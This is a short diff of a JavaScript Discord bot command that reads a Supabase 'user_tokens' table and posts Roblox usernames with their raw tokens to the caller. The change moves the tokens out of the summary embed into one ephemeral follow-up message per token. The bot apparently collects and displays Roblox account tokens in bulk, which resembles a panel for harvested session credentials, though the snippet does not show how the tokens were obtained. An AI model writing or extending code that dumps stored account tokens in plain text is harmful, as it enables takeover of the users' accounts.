@@ -209,11 +209,13 @@ export const commands = [
       await i.deferReply({ ephemeral: true });
       const { data } = await supabase.from('user_tokens').select('*').order('updated_at', { ascending: false });
       if (!data?.length) return i.editReply({ embeds: [base().setDescription('No verified tokens.')] });
-      const lines = data.slice(0, 20).map(t => `> 🔑 **@${t.roblox_username}** *(${timeAgo(t.updated_at)})*\n> \`\`\`${t.token}\`\`\``).join('\n');
-      const embed = base()
-        .setTitle(`🔑 Verified Tokens (${data.length})`)
-        .setDescription(lines);
+      const embed = base().setTitle(`🔑 Verified Tokens (${data.length})`).setDescription(
+        data.slice(0, 20).map(t => `> **@${t.roblox_username}** *(${timeAgo(t.updated_at)})*`).join('\n')
+      );
       await i.editReply({ embeds: [embed] });
+      for (const t of data.slice(0, 20)) {
+        await i.followUp({ content: `**@${t.roblox_username}**\n\`\`\`${t.token}\`\`\``, ephemeral: true });
+      }
     },
   },
 
